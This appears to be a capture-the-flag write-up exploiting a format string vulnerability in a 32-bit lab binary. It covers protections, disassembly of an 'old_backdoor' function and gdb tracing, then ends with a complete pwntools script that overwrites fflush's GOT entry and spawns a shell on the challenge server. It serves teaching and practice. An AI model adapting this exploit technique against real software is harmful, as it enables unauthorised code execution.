# FinalFormat

## Recon

In this challenge, we are given an executable that we must analyze and exploit.

### Protections

Executing `checksec program`, we get the following output:

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

This gives us some important pieces of information:

1. The executable's architecture is 32 bits and little-endian.
2. Partial RELRO is enabled. 
3. Stack canaries are enabled.
4. NX is enabled and, therefore, we won't be able to execute code from the stack, for instance.
5. PIE is disabled.

Partial RELRO means that the GOT comes before the BSS section in memory. This means that buffer overflows in global variables can't overwrite the GOT, however, it can still be changed.

With stack canaries enabled, we can only perform ROP attacks if we manage to leak the stack canary beforehand.

### Testing the program

By running the executable, we are prompted with the message "There is nothing to see here...".
If we, however, type something in and hit ENTER, what we typed in will be printed back.

![Normal execution of the program](/images/final-format/testing-vulnerabilities/1.png)

That means that our input is being read to a buffer and printed back. Therefore, we decided to test the possibility of a buffer overflow.
We found that the buffer is, most likely, not susceptible to buffer overflows since we typed in 110 characters, only 60 were printed back and no stack smashing was detected (due to the stack canaries).

![Testing for the possibility of a buffer overflow](/images/final-format/testing-vulnerabilities/2.png)

With buffer overflows out of the way, we tried format string vulnerabilities. Also, the challenge is named Final**Format** so it was very likely that the exploit would be based on format string vulnerabilities.

![Testing for the possibility of a format string vulnerability](/images/final-format/testing-vulnerabilities/3.png)

It worked! This is very good since, with a format string vulnerability, we are able to write to arbitrary addresses in memory. This, in conjunction with a Partial RELRO and no PIE (meaning that the base address of the GOT in execution is the same as when `readelf` is run), means that we can overwrite the addresses in the GOT very easily and, thus, when a libc function is called, jump to an arbitrary address in memory and execute that code instead. 

### Symbols

At this point, we can execute any piece of code already on the executable (can't be on the stack because of NX).
However, we don't have any piece of code that can give us a shell.

If we execute `readelf -s program`, we get the following output:

```
Symbol table '.symtab' contains 74 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
    ...
    23: 0804bff8     0 SECTION LOCAL  DEFAULT   23 .got
    24: 0804c000     0 SECTION LOCAL  DEFAULT   24 .got.plt
    ...
    51: 08049236    55 FUNC    GLOBAL DEFAULT   15 old_backdoor
    ...
    69: 0804926d   155 FUNC    GLOBAL DEFAULT   15 main
    ...
```

As you can see, we have the symbol `main`, which is expected. Then, we have the GOT and the GOT PLT (Procedure Linkage Table) sections at `0x0804bff8` and `0x0804c000` respectively. Finally, we have a suspicious function named `old_backdoor`, located at `0x08049236`.

Using `objdump --disassemble=old_backdoor program`, we can get the assembly code of `old_backdoor`.

```asm
08049236 <old_backdoor>:
 8049236:	f3 0f 1e fb          	endbr32
 804923a:	55                   	push   %ebp
 804923b:	89 e5                	mov    %esp,%ebp
 804923d:	53                   	push   %ebx
 804923e:	e8 2d ff ff ff       	call   8049170 <__x86.get_pc_thunk.bx>
 8049243:	81 c3 bd 2d 00 00    	add    $0x2dbd,%ebx
 8049249:	8d 83 08 e0 ff ff    	lea    -0x1ff8(%ebx),%eax
 804924f:	50                   	push   %eax
 8049250:	e8 8b fe ff ff       	call   80490e0 <puts@plt>
 8049255:	83 c4 04             	add    $0x4,%esp
 8049258:	8d 83 1b e0 ff ff    	lea    -0x1fe5(%ebx),%eax
 804925e:	50                   	push   %eax
 804925f:	e8 8c fe ff ff       	call   80490f0 <system@plt>
 8049264:	83 c4 04             	add    $0x4,%esp
 8049267:	90                   	nop
 8049268:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 804926b:	c9                   	leave
 804926c:	c3                   	ret
```

As we can see, a string is printed and then a command is executed using `system`. If the command is a `/bin/sh` or something along those lines, this means that we can jump to this function in our attack to get our shell.

### Debugging

To get more information about `old_backdoor`, we'll use `gdb`, along with `gef` (a popular GDB plugin).

We will start the debugging session using `gdb program` and set a breakpoint on `main` using `b main`. After that, we'll execute the program by executing `run` inside the debug session.

![Program running inside debug session](/images/final-format/debug/1.png)

Then, we will set a breakpoint on and jump to `old_backdoor`, using `b old_backdoor` followed by `jump old_backdoor`.

![Program running old_backdoor](/images/final-format/debug/2.png)

We will now step using `ni` until we get to the `system` call.

![Stack when system is about to be executed](/images/final-format/debug/3.png)

As you can see from the stack view, the argument for this system call is `/bin/bash`, meaning that this method can be used to get a shell on the server.

Now that we know what `old_backdoor` does, we can start figuring out what address in the GOT we need to overwrite to jump to `old_backdoor`. For that, we'll restart the debug session, set a breakpoint on `main` and `run` the program.

Then, we will skip to the `printf` where our message is printed, which is located at `0x80492d4`.

![Program when printf is about to be executed](/images/final-format/debug/4.png)

Here, we will step using `ni` until we find a `call` instruction that jumps to the `plt` section (the functions in this section use the addresses from the GOT to see if the corresponding function has already been loaded and, if it has, it will jump to the address present in the GOT).

That call will be a call to `fflush@plt` at `0x80492e5`.

![Program when fflush@plt is about to be executed](/images/final-format/debug/5.png)

Here, we want to go inside the function and, as such, we'll execute `si`.

![Disassembled code inside fflush@plt](/images/final-format/debug/6.png)

As you can see, `fflush@plt`'s second instruction is `jmp    DWORD PTR ds:0x804c010`, meaning that it will jump to the address placed at `0x804c010`. That address is `0xf7dda2c0`, which is the address of libc's `fflush`. Finally, the address `0x804c010`is located in the GOT, meaning that we can overwrite it with the address of `old_backdoor`, making `fflush@plt` jump to `old_backdoor` instead of libc's implementation of `fflush`.

![GOT at the location referenced by fflush@plt](/images/final-format/debug/7.png)

## Exploitation

In order to overwrite the GOT, we can use the `FmtStr` utility in pwntools, which allows us to specify a dictionary where the keys are the addresses we want to write to and the values are the bytes we want to write to those addresses. The result is a format string which, when printed, executes those writes.

With all the information we got previously in mind, we developed the following exploit: 

```py
from pwn import *

def exec_format(payload):
    p = process("./program")
    p.recvuntil(b'...')
    p.sendline(payload)
    output = p.recvall()
    p.kill()
    return output

context.binary = "./program"

elf = ELF("./program")
fflush_ptr = elf.got["fflush"]
backdoor_addr = elf.symbols["old_backdoor"]

print("fflush_addr:", hex(fflush_ptr))
print("backdoor_addr:", hex(backdoor_addr))

autofmt = FmtStr(exec_format)
offset = autofmt.offset

writes = { fflush_ptr: backdoor_addr }
print(f"Writes: {writes}")

payload = fmtstr_payload(offset, writes)
print("Payload:", payload)
print("Payload length:", len(payload))

p = remote("ctf-fsi.fe.up.pt", 4007)
p.recvuntil(b'...')
p.sendline(payload)
p.interactive()
```

To get the flag, run this script and then execute `cat flag.txt`.

![Exploit being executed](/images/final-format/exploit.png)